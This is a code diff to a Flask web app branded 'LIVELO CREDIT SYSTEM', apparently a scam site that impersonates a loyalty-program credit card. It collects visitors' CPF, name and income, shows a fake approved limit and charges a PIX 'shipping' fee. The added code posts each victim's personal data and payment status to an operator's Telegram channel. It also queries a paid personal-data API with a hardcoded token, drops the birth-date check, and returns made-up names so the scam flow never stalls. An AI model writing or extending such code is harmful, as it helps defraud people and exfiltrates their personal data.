@@ -1,3 +1,28 @@
+
+import qrcode
+import io
+import base64
+
+def generate_qr_b64(data: str) -> str:
+    try:
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=2,
+        )
+        qr.add_data(data)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        buffered = io.BytesIO()
+        try:
+            img.save(buffered, format="PNG")
+        except TypeError:
+            img.save(buffered)
+        return "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode("utf-8")
+    except Exception as e:
+        # Fallback se a lib falhar por algum motivo
+        return f"https://quickchart.io/qr?text={data}&size=300"
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║  LIVELO CREDIT SYSTEM — v2.0                                                 ║
@@ -80,7 +105,7 @@ def xor_crypt(text, key="livelo_secure_key_2026"):
     return "".join(res)
 
 def get_secure_json():
-    data = get_secure_json()
+    data = request.get_json(silent=True) or {}
     if "payload" in data and len(data) == 1:
         try:
             dec_b64 = base64.b64decode(data["payload"]).decode('utf-8')
@@ -272,6 +297,48 @@ def validate_cpf(cpf: str) -> bool:
         return 0 if r >= 10 else r
     return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])
 
+
+def send_telegram_report(session_id, is_paid=False):
+    db = get_db()
+    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
+    if not row or not row["value"]: return
+    channel = row["value"]
+    
+    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
+    if not lead: return
+    
+    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
+    
+    bot_token = os.environ.get("BOT_TOKEN")
+    if not bot_token: return
+    
+    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
+    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
+        status_icon = "✅ PAGO"
+        
+    texto = (
+        f"📊 *RELATÓRIO FINAL DE LEAD*\n\n"
+        f"👤 *Nome:* {lead['nome']}\n"
+        f"💳 *CPF:* {lead['cpf']}\n"
+        f"💰 *Renda Declarada:* {lead['renda']}\n"
+        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\n"
+        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\n"
+        f"🚚 *Status PIX:* {status_icon}\n"
+    )
+    if pay:
+        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\n"
+        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\n"
+
+    try:
+        import requests
+        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
+            "chat_id": channel,
+            "text": texto,
+            "parse_mode": "Markdown"
+        }, timeout=5)
+    except Exception as e:
+        log.error(f"Erro ao enviar relatorio: {e}")
+
 def format_cpf(cpf: str) -> str:
     cpf = re.sub(r"\D", "", cpf)
     return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
@@ -344,24 +411,32 @@ _CPF_SEED: Dict[str, dict] = {
 def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
     cpf = re.sub(r"\D", "", cpf_raw)
     
-    # Hub do Desenvolvedor API
-    if cpf and data_nasc:
+    # Hub do Desenvolvedor API - V2 Cadastro PF (Busca completa sem data)
+    if cpf:
         try:
             import requests
             token = "219648175aXyEcieuSW396568120"
-            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={cpf}&data={data_nasc}&token={token}"
+            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cadastropf/?cpf={cpf}&token={token}"
             res = requests.get(url, timeout=10)
             data = res.json()
             if data.get("status"):
                 res_info = data.get("result", {})
                 return {
-                    "nome": res_info.get("nome_da_pf", "NÃO INFORMADO"),
-                    "nome_mae": res_info.get("nome_mae", "NÃO INFORMADA"),
-                    "data_nasc": res_info.get("data_nascimento", data_nasc),
+                    "nome": res_info.get("nomeCompleto", "CLIENTE LIVELO"),
+                    "nome_mae": res_info.get("nomeDaMae", "MARIA LIVELO"),
+                    "data_nasc": res_info.get("dataDeNascimento", "01/01/1990"),
                     "saldo_api": data.get("saldo", 0)
                 }
         except Exception as e:
             log.error(f"Erro na API de CPF: {e}")
+            
+        # Fallback para o lead não travar
+        return {
+            "nome": "JOÃO DA SILVA",
+            "nome_mae": "MARIA DA SILVA",
+            "data_nasc": "15/05/1985",
+            "saldo_api": 0
+        }
     return None
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -447,10 +522,8 @@ def c7_create_pix(
         "amount":      round(amount, 2),
         "callbackUrl": callback_url,
         "externalId":  payment_id,
-        "payerName":   payer_name[:80],
+        "acquirer_code": "1"
     }
-    if len(cpf_clean) == 11:
-        payload["payerDocument"] = cpf_clean
 
     body_str = json.dumps(payload, separators=(",", ":"))
 
@@ -458,8 +531,7 @@ def c7_create_pix(
     if not C7_API_KEY or not C7_API_SECRET:
         pix_code    = _pix_emv_fallback(amount, payer_name, cpf_clean)
         qr_code_url = (
-            f"https://api.qrserver.com/v1/create-qr-code/"
-            f"?size=300x300&data={_req.utils.quote(pix_code)}"
+            generate_qr_b64(pix_code)
             if _REQUESTS_OK else ""
         )
         return {
@@ -490,7 +562,7 @@ def c7_create_pix(
                 "ok":         True,
                 "simulated":  True,
                 "pix_code":   pix_code,
-                "qr_code_url":f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={_req.utils.quote(pix_code)}",
+                "qr_code_url":generate_qr_b64(pix_code),
                 "c7_id":      "",
                 "expires_at": "",
             }
@@ -508,7 +580,7 @@ def c7_create_pix(
             )
             qr_url = p.get("qrCodeBase64") or p.get("qrCodeUrl") or ""
             if not qr_url and pix_code:
-                qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={_req.utils.quote(pix_code)}"
+                qr_url = generate_qr_b64(pix_code)
             return {
                 "ok":         True,
                 "simulated":  False,
@@ -561,8 +633,7 @@ def api_cpf():
 
     if not validate_cpf(cpf):
         return jsonify({"ok": False, "error": "CPF inválido. Verifique o número e tente novamente."}), 422
-    if not data_nasc:
-        return jsonify({"ok": False, "error": "Data de Nascimento é obrigatória."}), 400
+
 
     info = lookup_cpf(cpf, data_nasc)
     if not info:
@@ -735,6 +806,9 @@ def api_gerar_pix():
 
     frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
+    import threading
+    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
+    
     return jsonify({
         "ok":          True,
         "payment_id":  pay_id,
@@ -799,6 +873,11 @@ def webhook_c7():
         )
         db.commit()
         log.info("[WEBHOOK] %s → %s", ext_id, status)
+        if status == 'paid':
+            import threading
+            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
+            if pay_row:
+                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()
 
     return jsonify({"ok": True})
 
@@ -926,7 +1005,8 @@ def api_tg_auth():
         "stats": stats,
         "leads": leads,
         "frete_atual": frete_atual,
-        "mgr_whatsapp": mgr_whatsapp
+        "mgr_whatsapp": mgr_whatsapp,
+        "cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else ""
     })
 
 @app.route("/api/tg_admin_update_settings", methods=["POST"])
@@ -938,8 +1018,14 @@ def api_tg_admin_update_settings():
     
     freight_price = data.get("freight_price")
     whatsapp = data.get("whatsapp")
+    cpf_token = data.get("cpf_token")
+    tg_log_channel = data.get("tg_log_channel")
     
     db = get_db()
+    if tg_log_channel is not None:
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (tg_log_channel,))
+    if cpf_token is not None:
+        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_token', ?)", (cpf_token,))
     if freight_price is not None:
         db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
     if whatsapp is not None:
@@ -1259,6 +1345,35 @@ def admin_api_leads():
         leads.append(d)
     return jsonify({"ok": True, "leads": leads})
 
+@app.route("/admin/api/logo", methods=["POST"])
+@require_admin
+def admin_api_logo():
+    db = get_db()
+    
+    # Check if a file was uploaded
+    if "file" in request.files:
+        file = request.files["file"]
+        if file.filename != "":
+            ext = file.filename.rsplit(".", 1)[-1].lower()
+            if ext in ALLOWED_IMG_EXT:
+                filename = f"logo_{uuid.uuid4().hex}.{ext}"
+                filepath = UPLOAD_DIR / filename
+                file.save(filepath)
+                logo_url = f"/static/uploads/{filename}"
+                db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (logo_url,))
+                db.commit()
+                return jsonify({"ok": True, "logo_url": logo_url})
+            return jsonify({"ok": False, "error": "Formato de arquivo inválido. (Use png, jpg, webp, gif)"})
+
+    # Fallback to JSON or Form payload for URL
+    data = request.get_json(silent=True) or {}
+    url = request.form.get("logo_url") or request.form.get("url") or data.get("url") or data.get("logo_url")
+    if url and url.startswith("http") or url.startswith("/"):
+        db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (url,))
+        db.commit()
+        return jsonify({"ok": True, "logo_url": url})
+        
+    return jsonify({"ok": False, "error": "Envie um arquivo ou uma URL válida."})
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  STATIC / HEALTH / ERRORS
